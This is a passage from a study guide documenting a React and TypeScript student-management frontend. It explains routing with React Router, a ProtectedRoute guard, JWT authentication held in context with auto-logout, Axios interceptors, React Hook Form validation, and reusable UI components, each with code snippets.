    onClick={() => handleSearchTypeChange(type)}
    ...
  >
    {searchTypeLabels[type]}
  </button>
))}
```

---

## React Router v7

---

### 19. BrowserRouter and Routes Setup

**What it is**

React Router is a library for client-side routing — navigating between pages without a full browser reload. `BrowserRouter` uses the HTML5 History API to keep the URL in sync with the rendered component. `Routes` is the container that matches the current URL against a list of `Route` definitions.

**Why it is used**

Single-Page Applications (SPAs) need to simulate multi-page navigation. React Router intercepts link clicks and uses `history.pushState()` to change the URL without a page reload, then renders the matching component tree.

**How it works in this project**

**Code snippet — `src/App.tsx`**

```tsx
const App: React.FC = () => {
  return (
    <BrowserRouter>       {/* Provides routing context to the whole app */}
      <AuthProvider>
        <AppRoutes />
        <Toaster ... />
      </AuthProvider>
    </BrowserRouter>
  );
};
```

`BrowserRouter` wraps the entire application so all components have access to routing hooks. `AuthProvider` is inside `BrowserRouter` because `AuthContext` components (like `Navbar`) need router hooks.

---

### 20. Route and Path Matching

**What it is**

A `Route` component maps a URL path to a React element. When the current URL matches the path, React Router renders that element.

**How it works in this project**

**Code snippet — `src/App.tsx`**

```tsx
<Routes>
  {/* Public routes — accessible without authentication */}
  <Route path="/login" element={<LoginPage />} />
  <Route path="/register" element={<RegisterPage />} />

  {/* Protected route — wrapped in ProtectedRoute guard */}
  <Route
    path="/students"
    element={
      <ProtectedRoute>
        <StudentsPage />
      </ProtectedRoute>
    }
  />

  {/* Catch-all redirects */}
  <Route path="/" element={<Navigate to="/students" replace />} />
  <Route path="*" element={<Navigate to="/students" replace />} />
</Routes>
```

- `path="/"` redirects the root URL to `/students`
- `path="*"` is the wildcard — any URL that doesn't match above redirects to `/students`
- `replace` on `Navigate` replaces the current history entry instead of pushing a new one (so the back button doesn't loop)

---

### 21. ProtectedRoute Component

**What it is**

A `ProtectedRoute` is a wrapper component that checks authentication before rendering its children. If the user is not authenticated, it redirects to the login page instead.

**Why it is used**

Without protection, any user who knows the URL `/students` could access it directly. The `ProtectedRoute` pattern creates a declarative guard at the router level — every protected page automatically gets the authentication check.

**How it works in this project**

**Code snippet — `src/components/ProtectedRoute.tsx`**

```tsx
const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children }) => {
  const { isAuthenticated } = useAuth();
  const location = useLocation();

  if (!isAuthenticated) {
    // Preserve the attempted URL so we can redirect back after login
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  return <>{children}</>;
};
```

The critical feature here is `state={{ from: location }}`. When an unauthenticated user tries to visit `/students`, they are redirected to `/login` but the original URL is saved in the navigation state. After successful login, `LoginPage` reads this state and redirects back:

```tsx
// LoginPage.tsx reads the 'from' state
const from = (location.state as { from?: { pathname: string } })?.from?.pathname || '/students';
navigate(from, { replace: true });
```

---

### 22. useNavigate Hook

**What it is**

`useNavigate` returns a `navigate` function that performs programmatic navigation — changing the URL from JavaScript code rather than from a user clicking a `<Link>`.

**Why it is used**

After form submission (login, register), the user must be redirected to another page. This cannot be done declaratively with `<Link>` because the navigation is conditional (only redirect on success) and triggered by async logic.

**How it works in this project**

**Code snippet — `src/pages/LoginPage.tsx`**

```tsx
const navigate = useNavigate();
const from = (location.state as { from?: { pathname: string } })?.from?.pathname || '/students';

const onSubmit = async (values: FormValues) => {
  setLoading(true);
  try {
    const { token } = await authApi.login(values);
    login(token);
    toast.success('Welcome back!');
    navigate(from, { replace: true }); // Programmatic redirect after login
  } catch (err) {
    toast.error(getErrorMessage(err));
  } finally {
    setLoading(false);
  }
};
```

**Code snippet — `src/components/Navbar.tsx`**

```tsx
const handleLogout = () => {
  logout();
  navigate('/login'); // Navigate to login after logout
};
```

---

### 23. useLocation Hook

**What it is**

`useLocation` returns the current location object, which contains the current URL path, search parameters, hash, and any state that was passed during navigation.

**Why it is used**

Two use cases in this project:
1. **Active link highlighting**: Checking `location.pathname` to apply active styles to the correct nav link.
2. **Redirect preservation**: Reading `location.state.from` to know where to redirect after login.

**How it works in this project**

**Code snippet — `src/components/Navbar.tsx`**

```tsx
const location = useLocation();

// Apply different styles based on whether this link is active
<Link
  to="/students"
  className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
    location.pathname === '/students'
      ? 'bg-indigo-50 text-indigo-700'   // Active style
      : 'text-gray-600 hover:text-gray-900 hover:bg-gray-50' // Inactive style
  }`}
>
  Students
</Link>
```

**Code snippet — `src/pages/LoginPage.tsx`**

```tsx
const location = useLocation();
// Read the 'from' state that ProtectedRoute set during redirect
const from = (location.state as { from?: { pathname: string } })?.from?.pathname || '/students';
```

---

## Context API

---

### 24. React Context — createContext, Provider, useContext

**What it is**

React Context provides a way to pass data through the component tree without manually passing props at every level. It consists of three parts:
1. `createContext(defaultValue)` — creates the context object
2. `Context.Provider` — wraps components that should have access to the context value
3. `useContext(Context)` — reads the current context value inside any descendant component

**How it works in this project**

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// 1. Create the context with null as the default
const AuthContext = createContext<AuthContextType | null>(null);

// 2. Provider component that holds the actual state
export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [token, setToken] = useState<string | null>(null);
  // ... logic ...

  return (
    <AuthContext.Provider
      value={{ token, isAuthenticated: !!token, login, logout }}
    >
      {children}
    </AuthContext.Provider>
  );
};

// 3. Custom hook that wraps useContext with a null check
export const useAuth = (): AuthContextType => {
  const ctx = useContext(AuthContext);
  if (!ctx) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return ctx;
};
```

The null check in `useAuth` is important: it throws a descriptive error rather than producing a confusing `undefined is not an object` error if someone uses the hook outside the provider.

---

### 25. Why Context over Prop Drilling

**What prop drilling is**

Prop drilling occurs when data needs to be passed through many intermediate components that don't use it, only to reach a deeply nested component that does. Example: `App` has the token, but `Navbar` → `UserMenu` → `LogoutButton` all need to receive it as a prop even though only `LogoutButton` uses it.

**Why Context solves it**

Context makes data available to any descendant component directly, without the intermediate components needing to know about it. In this project, the token and auth functions are needed in:
- `Navbar` (to show/hide buttons)
- `ProtectedRoute` (to check authentication)
- `LoginPage` and `RegisterPage` (to call `login()`)
- `App.tsx` (to wire up the Axios interceptors)

Without Context, `App` would have to pass `token`, `login`, and `logout` as props down through every component. With `AuthContext`, any component can call `useAuth()` and get immediate access.

---

### 26. AuthContext — Token Storage in Memory

**What it is**

The JWT token is stored in React state (`useState`), which means it lives in JavaScript heap memory — not in `localStorage`, `sessionStorage`, or cookies.

**Why memory storage is used**

This is a deliberate security decision. `localStorage` is accessible by any JavaScript running on the page — including injected scripts from XSS attacks. Memory storage (React state) is not accessible to injected scripts because it is not a global browser API. Full details are covered in [Section 56](#56-xss-and-why-localstorage-is-unsafe-for-tokens).

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// Token stored in memory only (not localStorage) for security
const [token, setToken] = useState<string | null>(null);

const login = useCallback((newToken: string) => {
  setToken(newToken);           // Store in React state (memory)
  scheduleAutoLogout(newToken); // Set expiry timer
}, [scheduleAutoLogout]);

const logout = useCallback(() => {
  setToken(null);               // Clear from memory
  // Note: no localStorage.removeItem() needed — it was never there
}, []);
```

The trade-off: memory storage means the token is **lost on page refresh**. The user must log in again after refreshing. This is acceptable in many enterprise apps and is the correct security/convenience balance for this use case.

---

### 27. Auto-Logout with setTimeout

**What it is**

When a JWT is received, its expiry time (`exp` claim) is decoded from the token payload. A `setTimeout` is scheduled to fire exactly when the token expires, automatically calling `logout()`.

**Why it is used**

Without auto-logout, the user's session would appear active in the UI even after the JWT expires. The next API call would return a 401 (which the interceptor handles), but the user experience is better if the app proactively logs out and shows the login page when the session expires.

**How it works in this project**

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
const scheduleAutoLogout = useCallback((tok: string) => {
  if (logoutTimerRef.current) {
    clearTimeout(logoutTimerRef.current); // Cancel any existing timer first
  }
  try {
    const decoded = jwtDecode(tok);
    if (decoded?.exp) {
      const msUntilExpiry = decoded.exp * 1000 - Date.now();
      // decoded.exp is in seconds; Date.now() is in milliseconds
      if (msUntilExpiry > 0) {
        logoutTimerRef.current = setTimeout(() => {
          logout();
        }, msUntilExpiry);
      } else {
        logout(); // Token is already expired — log out immediately
      }
    }
  } catch {
    // If decode fails, do nothing — the 401 interceptor will handle it
  }
}, [logout]);
```

The timer is stored in `logoutTimerRef` (a `useRef`) so it can be cancelled when the user logs out manually before the token expires, preventing a ghost logout from firing.

---

### 28. setAuthTokenGetter and setOnUnauthorized

**What they are**

These are module-level setter functions exported from `axiosInstance.ts` that allow the `AuthContext` to "wire up" the Axios instance with live authentication state.

**Why this pattern is used**

There is a dependency problem: `axiosInstance` is created as a module singleton before React renders. It cannot directly import from `AuthContext` (that would create circular imports, and the token is React state that doesn't exist at module initialization time). Instead, `axiosInstance` exposes setter functions, and `App.tsx` calls them with closures that capture the live React state.

**How it works in this project**

**Code snippet — `src/api/axiosInstance.ts`**

```ts
// Module-level variables — initially null
let authTokenGetter: (() => string | null) | null = null;
let onUnauthorized: (() => void) | null = null;

// Setter functions called from outside
export function setAuthTokenGetter(getter: () => string | null) {
  authTokenGetter = getter;
}
export function setOnUnauthorized(handler: () => void) {
  onUnauthorized = handler;
}
```

**Code snippet — `src/App.tsx`**

```tsx
const AppRoutes: React.FC = () => {
  const { token, logout } = useAuth();

  // Whenever token changes, update the getter in axiosInstance
  useEffect(() => {
    setAuthTokenGetter(() => token); // Passes a closure over the current token
  }, [token]);

  // Wire up the 401 handler to call the real logout function
  useEffect(() => {
    setOnUnauthorized(() => {
      logout();
    });
  }, [logout]);
  ...
};
```

This pattern cleanly decouples the Axios module from React's state system while keeping them synchronized.

---

## Axios & API Layer

---

### 29. Axios Instance

**What it is**

`axios.create()` creates a pre-configured Axios instance. All requests made through this instance automatically apply the specified base URL, headers, and timeout — you never have to repeat them.

**Why it is used**

Using a shared instance rather than calling `axios.get()` directly provides:
1. **DRY configuration**: Base URL and headers are set once
2. **Interceptor attachment**: Request/response interceptors apply to all calls
3. **Consistency**: All API calls behave the same way (same timeout, same error handling)

**Code snippet — `src/api/axiosInstance.ts`**

```ts
const axiosInstance = axios.create({
  baseURL: 'http://localhost:8081',  // Spring Boot backend URL
  headers: {
    'Content-Type': 'application/json', // All requests send JSON
  },
  timeout: 10000, // 10 second timeout — prevents hanging requests
});
```

Every API call in `authApi.ts` and `studentsApi.ts` imports and uses this instance:

```ts
import axiosInstance from './axiosInstance';
const response = await axiosInstance.get<Student[]>('/api/students');
// The full URL is: http://localhost:8081/api/students
```

---

### 30. Request Interceptor

**What it is**

A request interceptor is a function that runs before every HTTP request is sent. It can read and modify the request configuration.

**Why it is used**

Every protected API endpoint requires an `Authorization: Bearer <token>` header. Without an interceptor, every single API call would need to manually add this header. The interceptor adds it automatically and centrally.

**Code snippet — `src/api/axiosInstance.ts`**

```ts
axiosInstance.interceptors.request.use((config) => {
  // Call the getter function to get the current token from React state
  const token = authTokenGetter ? authTokenGetter() : null;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config; // Must return the (modified) config
});
```

The `authTokenGetter` is a function reference (set by `setAuthTokenGetter` in `App.tsx`) that, when called, returns the current token value from React's state. This indirection is necessary because the interceptor is registered once at module creation time but needs the current live token value at the time of each request.

---

### 31. Response Interceptor — 401 Handling

**What it is**

A response interceptor runs after every HTTP response is received. The error branch runs when the server returns an error status code (4xx, 5xx).

**Why it is used**

A 401 Unauthorized response means the JWT has expired or is invalid. Rather than handling this in every individual API call, the interceptor handles it once globally — triggering logout and redirecting to login automatically.

**Code snippet — `src/api/axiosInstance.ts`**

```ts
axiosInstance.interceptors.response.use(
  (response) => response, // Pass successful responses through unchanged
  (error) => {
    if (error.response?.status === 401 && onUnauthorized) {
      onUnauthorized(); // Calls logout() from AuthContext
    }
    return Promise.reject(error); // Still reject — callers can handle other errors
  }
);
```

The `Promise.reject(error)` is important: after calling `onUnauthorized`, the error is still rejected so that callers in `useStudents` catch it and can display appropriate error messages if needed.

---

### 32. API Modules — Separation of Concerns

**What they are**

`authApi.ts` and `studentsApi.ts` are modules that export plain objects containing async functions for each API endpoint. They are pure functions of their inputs — they make a request and return the typed response.

**Why separate modules**

Separating API calls into their own modules means:
1. Components and hooks never contain raw HTTP logic
2. The API layer can be changed (e.g., switching from REST to GraphQL) without touching UI components
3. Each API module is independently testable
4. TypeScript generics on Axios calls ensure type safety between HTTP responses and application types

**Code snippet — `src/api/studentsApi.ts`**

```ts
export const studentsApi = {
  getAll: async (): Promise<Student[]> => {
    const response = await axiosInstance.get<Student[]>('/api/students');
    return response.data;
  },

  create: async (data: CreateStudentRequest): Promise<Student> => {
    const response = await axiosInstance.post<Student>('/api/students', data);
    return response.data;
  },

  searchByEmail: async (email: string): Promise<Student[]> => {
    const response = await axiosInstance.get<Student[]>('/api/students/search/by-email', {
      params: { email }, // Axios serializes this as ?email=value
    });
    return response.data;
  },
  // ... more methods
};
```

---

### 33. async/await with Axios

**What it is**

`async/await` is syntactic sugar over JavaScript Promises that makes asynchronous code look and behave like synchronous code. An `async` function always returns a Promise. `await` pauses execution inside the function until the Promise resolves.

**Why it is used**

Without `async/await`, promise chaining with `.then().catch()` becomes deeply nested. `async/await` with `try/catch` is more readable and easier to reason about, especially when you need to update loading state before and after an operation.

**How it works in this project**

**Code snippet — `src/hooks/useStudents.ts`**

```ts
const createStudent = useCallback(
  async (payload: { firstName: string; lastName: string; email: string }) => {
    setLoading(true);      // Show loading indicator
    try {
      const newStudent = await studentsApi.create(payload); // Wait for API
      setStudents((prev) => [...prev, newStudent]);         // Update state
      toast.success('Student created successfully!');
      return newStudent;
    } catch (err) {
      const msg = getErrorMessage(err); // Extract readable message
      toast.error(msg);
      throw err; // Re-throw so the caller (StudentsPage) can react
    } finally {
      setLoading(false); // Always hide loading indicator
    }
  },
  []
);
```

The `finally` block is key: it always runs regardless of success or failure, ensuring `setLoading(false)` is called even if an error occurs.

---

## Forms — React Hook Form

---

### 34. useForm Hook

**What it is**

`useForm` is the main hook from the React Hook Form library. It initializes the form engine and returns a collection of functions and objects used to manage form state, validation, and submission.

**Why it is used**

React Hook Form manages form state using **uncontrolled inputs** (relying on the DOM's native form state via refs) rather than controlled inputs (React state for every keystroke). This means no `useState` for every input field and no re-render on every keystroke — dramatically better performance for complex forms.

**Code snippet — `src/components/StudentForm.tsx`**

```tsx
const {
  register,        // Connects inputs to the form
  handleSubmit,    // Wraps submission with validation
  formState: { errors }, // Validation error messages
} = useForm<FormValues>({
  defaultValues: initialData
    ? {
        firstName: initialData.firstName,
        lastName: initialData.lastName,
        email: initialData.email,
      }
    : { firstName: '', lastName: '', email: '' },
});
```

The generic `useForm<FormValues>` types the entire form — TypeScript knows what fields exist and what types they have.

---

### 35. register Function

**What it is**

`register('fieldName', validationRules)` returns an object containing `{ name, ref, onChange, onBlur }` which, when spread onto an input element, connects that input to the form state engine.

**Why it is used**

Instead of manually wiring `value={state.field}` and `onChange={(e) => setState({...state, field: e.target.value})}` for every input, `register` does all of this with one spread.

**Code snippet — `src/components/StudentForm.tsx`**

```tsx
<Input
  label="First Name"
  placeholder="e.g. John"
  error={errors.firstName?.message}
  {...register('firstName', {
    required: 'First name is required',
    minLength: { value: 2, message: 'At least 2 characters' },
    maxLength: { value: 50, message: 'At most 50 characters' },
  })}
/>
```

The spread `{...register('firstName', ...)}` expands to:
```tsx
name="firstName"
ref={refCallback}    // React Hook Form attaches its internal ref
onChange={handler}   // Triggers validation on change
onBlur={handler}     // Triggers validation on blur
```

The `Input` component uses `forwardRef` precisely to support this ref attachment.

---

### 36. handleSubmit

**What it is**

`handleSubmit(yourFunction)` returns an event handler for the form's `onSubmit` event. It runs all registered validation rules, and only calls `yourFunction` with the typed form values if all validations pass.

**Code snippet — `src/components/StudentForm.tsx`**

```tsx
const handleFormSubmit = async (values: FormValues) => {
  await onSubmit(values); // Only called if all validations pass
};

return (
  <form onSubmit={handleSubmit(handleFormSubmit)} noValidate>
    ...
  </form>
);
```

`noValidate` disables the browser's native HTML5 validation — React Hook Form handles all validation instead, providing full control over error message display.

---

### 37. formState.errors

**What it is**

`formState.errors` is an object where each key corresponds to a form field that has a validation error. The value contains the error `type` and `message` string.

**Code snippet — `src/pages/RegisterPage.tsx`**

```tsx
<Input
  label="Confirm Password"
  type="password"
  error={errors.confirmPassword?.message}
  {...register('confirmPassword', {
    required: 'Please confirm your password',
    validate: (val) => val === passwordValue || 'Passwords do not match',
  })}
/>
```

`errors.confirmPassword?.message` uses optional chaining — it safely returns `undefined` if there is no error, which the `Input` component treats as "no error to display."

The custom `validate` function compares against `passwordValue`, which is obtained with:

```tsx
const passwordValue = watch('password');
```

`watch` subscribes to a specific field's value, re-rendering the component when that value changes.

---

### 38. reset()

**What it is**

`reset(values?)` programmatically resets all form fields to their default values (or to new provided values). It clears both the field values and all validation errors.

**Why it is used**

After successfully creating a student, the modal closes and the next time it opens, the form must be empty. If the same `useForm` instance persists, stale data would remain in the inputs. `reset()` ensures a clean slate.

**Code snippet — `src/components/StudentForm.tsx`**

In `StudentForm`, the `defaultValues` are set via `useForm()`. The form itself does not explicitly call `reset()` — instead, the `Modal` component unmounts `StudentForm` when `isOpen` becomes false, which destroys the `useForm` instance entirely. When the modal opens again, a fresh `useForm` instance is created with clean defaults.

For cases where the form must persist across opens (such as in edit mode where initial data pre-fills the form), `defaultValues` in `useForm` is passed `initialData`:

```tsx
defaultValues: initialData
  ? { firstName: initialData.firstName, lastName: initialData.lastName, email: initialData.email }
  : { firstName: '', lastName: '', email: '' },
```

---

### 39. Why React Hook Form over Controlled Components

**What controlled components are**

A controlled component stores the input value in React state and passes it back via `value` and `onChange`:

```tsx
// Controlled — re-renders on EVERY keystroke
const [firstName, setFirstName] = useState('');
<input value={firstName} onChange={e => setFirstName(e.target.value)} />
```

**Why React Hook Form is better for this project**

| Aspect | Controlled Components | React Hook Form |
|--------|----------------------|-----------------|
| Re-renders | On every keystroke | Only on validation trigger or submit |
| State | `useState` per field | DOM ref per field |
| Validation | Manual in `onChange` | Declarative rules in `register()` |
| Error display | Manual state management | Automatic via `formState.errors` |
| Default values | Set via `useState` initial value | `defaultValues` in `useForm()` |
| Code volume | High | Low |

For a form like `StudentForm` with 3 fields, the difference is modest. For forms with 20+ fields (like complex admin forms), the performance and code savings are dramatic.

---

## Component Architecture

---

### 40. Button Component

**What it is**

A reusable button component that accepts a `variant` prop to control visual style, a `size` prop for dimensions, a `loading` prop to show a spinner and disable interaction, and a `leftIcon` prop for icon display.

**Why it is designed this way**

Without a shared Button component, every developer would write their own button with slightly different styles. A single, well-designed Button component ensures visual consistency, accessibility, and predictable behavior across the application.

**Code snippet — `src/components/Button.tsx`**

```tsx
type Variant = 'primary' | 'secondary' | 'danger' | 'ghost';

const variantClasses: Record<Variant, string> = {
  primary:   'bg-indigo-600 text-white hover:bg-indigo-700 focus:ring-indigo-500 disabled:bg-indigo-300',
  secondary: 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50 focus:ring-indigo-500 disabled:opacity-50',
  danger:    'bg-red-600 text-white hover:bg-red-700 focus:ring-red-500 disabled:bg-red-300',
  ghost:     'bg-transparent text-gray-600 hover:bg-gray-100 focus:ring-gray-400 disabled:opacity-50',
};

// Extends React's native button attributes — all standard HTML button props work
interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: Variant;
  size?: Size;
  loading?: boolean;
  leftIcon?: React.ReactNode;
}
```

The `extends React.ButtonHTMLAttributes<HTMLButtonElement>` pattern is important — it means `Button` accepts all standard button props (`onClick`, `type`, `disabled`, `aria-*`) in addition to the custom ones, and TypeScript validates all of them.

The loading state replaces the left icon with a `Spinner` and disables the button:

```tsx
<button disabled={disabled || loading} ...>
  {loading ? <Spinner size="sm" /> : leftIcon}
  {children}
</button>
```

---

### 41. Input Component

**What it is**

A labeled input field that renders a `<label>`, an `<input>`, an optional error message, and an optional helper text — all as a single composed unit.

**Why it is designed with forwardRef**

React Hook Form's `register()` function needs to attach a `ref` to the underlying `<input>` DOM element to read its value. When a component wraps `<input>`, the ref must be forwarded through the wrapper using `forwardRef`.

**Code snippet — `src/components/Input.tsx`**

```tsx
const Input = forwardRef<HTMLInputElement, InputProps>(
  ({ label, error, helperText, className = '', id, ...rest }, ref) => {
    const inputId = id || label?.toLowerCase().replace(/\s+/g, '-');
    return (
      <div className="flex flex-col gap-1">
        {label && (
          <label htmlFor={inputId} className="text-sm font-medium text-gray-700">
            {label}
          </label>
        )}
        <input
          ref={ref}  // Forward the ref to the native input
          id={inputId}
          className={`
            w-full rounded-lg border px-3 py-2.5 text-sm ...
            ${error ? 'border-red-400 bg-red-50' : 'border-gray-300 bg-white hover:border-gray-400'}
          `}
          {...rest}  // Passes through all register() props (name, onChange, onBlur)
        />
        {error && <p className="text-xs text-red-600">{error}</p>}
        {helperText && !error && <p className="text-xs text-gray-500">{helperText}</p>}
      </div>
    );
  }
);

Input.displayName = 'Input'; // Needed for React DevTools to show correct name
```

The `inputId` is auto-generated from the label text (`"First Name"` → `"first-name"`), ensuring the `<label>` and `<input>` are properly associated for accessibility.

---

### 42. Modal Component

**What it is**

An overlay dialog that renders centered over the page content. It handles Escape key dismissal, prevents background scrolling, and provides accessibility attributes.

**Why these features matter**

- **Escape key**: Standard browser/OS behavior — users expect pressing Escape to close dialogs
- **Body scroll lock**: Without `overflow: hidden` on the body, the background page can be scrolled behind the modal, which is disorienting
- **`role="dialog"` and `aria-modal="true"`**: These ARIA attributes tell screen readers that the element is a dialog window. `aria-labelledby` connects the dialog to its title for screen reader announcement

**Code snippet — `src/components/Modal.tsx`**

```tsx
// Escape key handler
useEffect(() => {
  if (!isOpen) return;
  const handler = (e: KeyboardEvent) => {
    if (e.key === 'Escape') onClose();
  };
  document.addEventListener('keydown', handler);
  return () => document.removeEventListener('keydown', handler);
}, [isOpen, onClose]);

// Return null when closed — completely unmounts the content
if (!isOpen) return null;

return (
  <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
    {/* Backdrop — clicking it closes the modal */}
    <div
      className="absolute inset-0 bg-black/50 backdrop-blur-sm"
      onClick={onClose}
      aria-hidden="true"  // Hidden from screen readers — it's decorative
    />

    {/* Panel */}
    <div
      role="dialog"
      aria-modal="true"
      aria-labelledby="modal-title"
      className={`relative w-full ${maxWidthMap[maxWidth]} bg-white rounded-2xl ...`}
    >
      ...
    </div>
  </div>
);
```

The `fixed inset-0` Tailwind classes position the backdrop to fill the entire viewport. `z-50` ensures the modal renders above everything else.

---

### 43. ConfirmDialog Component

**What it is**

A specialized modal used for destructive action confirmation. It wraps the `Modal` component and provides a standardized layout: a warning icon, a message, a Cancel button, and a confirm (danger) button.

**Why this pattern is used**

Destructive actions (delete) should require explicit confirmation to prevent accidental data loss. Rather than duplicating this UI pattern in every place a delete happens, `ConfirmDialog` provides a reusable, consistent implementation.

**Code snippet — `src/components/ConfirmDialog.tsx`**

```tsx
const ConfirmDialog: React.FC<ConfirmDialogProps> = ({
  isOpen, onClose, onConfirm, title, message,
  confirmLabel = 'Delete',
  loading = false,
}) => {
  return (
    <Modal isOpen={isOpen} onClose={onClose} title={title} maxWidth="sm">
      <div className="flex flex-col gap-6">
        <div className="flex items-start gap-4">
          {/* Warning icon in red circle */}
          <div className="flex-shrink-0 flex items-center justify-center h-10 w-10 rounded-full bg-red-100">
            <svg className="h-5 w-5 text-red-600" ...>...</svg>
          </div>
          <p className="text-sm text-gray-600 pt-2">{message}</p>
        </div>
        <div className="flex justify-end gap-3">
          <Button variant="secondary" onClick={onClose} disabled={loading}>Cancel</Button>
          <Button variant="danger" onClick={onConfirm} loading={loading}>{confirmLabel}</Button>
        </div>
      </div>
    </Modal>
  );
};
```

Usage in `StudentsPage`:

```tsx
<ConfirmDialog
  isOpen={!!deletingStudent}
  onClose={() => setDeletingStudent(null)}
  onConfirm={handleDeleteConfirm}
  title="Delete Student"
  message={`Are you sure you want to delete ${deletingStudent?.firstName} ${deletingStudent?.lastName}? This action cannot be undone.`}
  loading={deleteLoading}
/>
```

---

### 44. Navbar Component

**What it is**

A sticky top navigation bar that conditionally renders different links and actions based on authentication state. It uses `useLocation` to highlight the currently active link.

**Code snippet — `src/components/Navbar.tsx`**

```tsx
const Navbar: React.FC = () => {
  const { isAuthenticated, logout } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();

  const handleLogout = () => {
    logout();
    navigate('/login');
  };

  return (
    <nav className="sticky top-0 z-40 bg-white border-b border-gray-200 shadow-sm">
      ...
      {/* Active link detection */}
      <Link
        to="/students"
        className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
          location.pathname === '/students'
            ? 'bg-indigo-50 text-indigo-700'
            : 'text-gray-600 hover:text-gray-900 hover:bg-gray-50'
        }`}
      >
        Students
      </Link>
      ...
    </nav>
  );
};
```

`sticky top-0 z-40` makes the navbar stay visible as the user scrolls. The `z-40` (below the modal's `z-50`) means modals correctly appear above the navbar.

---

### 45. Spinner Component

**What it is**

A simple animated circular loading indicator with three size variants: `sm`, `md`, and `lg`.

**Code snippet — `src/components/Spinner.tsx`**

```tsx
const sizeMap = {
  sm: 'h-4 w-4 border-2',
  md: 'h-8 w-8 border-2',
  lg: 'h-12 w-12 border-4',
};

const Spinner: React.FC<SpinnerProps> = ({ size = 'md', className = '' }) => {
  return (
    <div
      className={`inline-block animate-spin rounded-full border-indigo-600 border-t-transparent ${sizeMap[size]} ${className}`}
      role="status"
      aria-label="Loading"
    />
  );
};
```

The animation works via Tailwind's `animate-spin` class. The circle effect comes from `rounded-full` (circular div) with `border-indigo-600` (visible border) and `border-t-transparent` (transparent top border creates the "gap" that spins). `role="status"` and `aria-label="Loading"` announce the loading state to screen readers.

---

### 46. StudentForm Component

**What it is**

A reusable form that handles both adding a new student and editing an existing one. It uses React Hook Form for validation and pre-fills fields when `initialData` is provided.

**Why it is reusable**

The add and edit forms have identical fields and validation rules. The only differences are:
1. Whether fields are pre-filled (edit) or empty (add)
2. The submit button label ("Add Student" vs "Save Changes")
3. Which API function the parent calls on submit

`StudentForm` handles #1 and #2 internally, while #3 is handled by the `onSubmit` prop callback — the form does not know or care whether it is adding or editing.

**Code snippet — `src/components/StudentForm.tsx`**

```tsx
// The form is truly reusable — only initialData differs
const StudentForm: React.FC<StudentFormProps> = ({
  initialData, // undefined for add, Student object for edit
  onSubmit,    // Caller provides the correct API function
  onCancel,
  loading = false,
}) => {
  const { register, handleSubmit, formState: { errors } } = useForm<FormValues>({
    defaultValues: initialData
      ? { firstName: initialData.firstName, ... }
      : { firstName: '', lastName: '', email: '' },
  });

  return (
    <form onSubmit={handleSubmit(handleFormSubmit)} noValidate>
      <Input label="First Name" error={errors.firstName?.message}
        {...register('firstName', { required: 'First name is required', ... })} />
      ...
      <Button type="submit" loading={loading}>
        {initialData ? 'Save Changes' : 'Add Student'} {/* Dynamic label */}
      </Button>
    </form>
  );
};
```

---

### 47. ProtectedRoute Component (Architecture View)

**What it is**

A route guard component that wraps protected pages. It reads authentication state and either renders the children or redirects to login.

**The broader pattern**

`ProtectedRoute` demonstrates the **Higher-Order Component (HOC) pattern** applied to routing. It is a component that takes other components (via `children`) and conditionally renders them. This pattern can be extended to role-based access control by adding a `requiredRole` prop.

**Code snippet — `src/components/ProtectedRoute.tsx`**

```tsx
const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children }) => {
  const { isAuthenticated } = useAuth();
  const location = useLocation();

  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  return <>{children}</>; // Fragment wrapper — renders children as-is
};
```

The `<>{children}</>` Fragment wrapper is used because React components must return a single root element, but `children` could be any number of elements. The Fragment wraps them without adding DOM nodes.

---

## State Management Patterns

---

### 48. Lifting State Up

**What it is**

"Lifting state up" means moving state to the closest common ancestor of all components that need it. When multiple sibling components need to share or react to the same data, that data must live in their parent.

**How it works in this project**

`StudentsPage` is the owner of all student-related state. The student list, loading state, and error state all live in `useStudents` which is called at the `StudentsPage` level. The child components (`StudentRow`, `StudentForm`, `ConfirmDialog`) receive only what they need via props.

```tsx
// StudentsPage holds all state
const { students, loading, error, fetchAll, ... } = useStudents();

// Modal state lives in StudentsPage — it's only relevant at this level
const [showAddModal, setShowAddModal] = useState(false);
const [editingStudent, setEditingStudent] = useState<Student | null>(null);

// StudentRow receives only what it needs — it does not manage state
<StudentRow
  key={student.id}
  student={student}
  onEdit={() => setEditingStudent(student)}   // Callback lifts action up
  onDelete={() => setDeletingStudent(student)} // Callback lifts action up
/>
```

`StudentRow` never manages state itself. When the edit button is clicked, it calls `onEdit()`, which updates `editingStudent` in `StudentsPage`, which then opens the edit modal. State flows down as props; events flow up as callbacks.

---

### 49. Loading and Error States Pattern

**What it is**

Every async operation has three possible states: loading (in progress), success (data), and error (failure). A robust UI must handle all three.

**The pattern in this project**

`useStudents` maintains `loading` and `error` alongside `students`. Components check these before deciding what to render.

**Code snippet — `src/hooks/useStudents.ts`**

```ts
const fetchAll = useCallback(async () => {
  setLoading(true);   // 1. Start loading
  setError(null);     // 1. Clear previous errors
  try {
    const data = await studentsApi.getAll();
    setStudents(data); // 2. Success — store data
  } catch (err) {
    const msg = getErrorMessage(err);
    setError(msg);     // 3. Error — store message
    toast.error(msg);  // 3. Show toast
  } finally {
    setLoading(false); // Always: stop loading
  }
}, []);
```

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
{/* Error banner — only shown when there's an error and not loading */}
{error && !loading && (
  <div className="rounded-xl bg-red-50 border border-red-200 p-4">
    <p className="text-sm text-red-700">{error}</p>
    <Button variant="ghost" size="sm" onClick={fetchAll}>Retry</Button>
  </div>
)}

{/* Table body — three states handled */}
{loading && students.length === 0 ? (
  <Spinner size="lg" />           // Initial load
) : students.length === 0 ? (
  <EmptyStateUI />                // No data
) : (
  <table>...</table>              // Has data
)}

